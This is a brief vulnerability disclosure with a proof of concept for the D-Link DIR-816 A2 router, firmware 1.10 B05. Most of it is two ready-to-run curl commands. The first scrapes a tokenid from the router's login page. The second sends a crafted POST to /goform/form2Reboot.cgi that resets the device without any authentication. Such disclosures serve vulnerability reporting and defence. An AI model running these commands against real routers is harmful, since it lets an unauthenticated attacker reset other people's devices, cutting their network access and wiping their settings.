# D-Link DIR-816 A2 Reset Router Without Authentication

**Vender** ：D-Link

**Firmware version**:1.10 B05

**Exploit Author**: GD@hillstone

**Vendor Homepage**: http://www.dlink.com.cn/

**Hardware Link**:http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-816

## POC

first,get the tokenid

`curl -s http://192.168.0.1/dir_login.asp | grep tokenid`



then,we could send the crafted parameter along with the token to the route:

```
curl -i -X POST http://192.168.0.1/goform/form2Reboot.cgi -d tokenid=xxxxx -d 'reset=Reset'
```

Attacker can use a API URL "/goform/form2Reboot.cgi" to reset router without authentication.

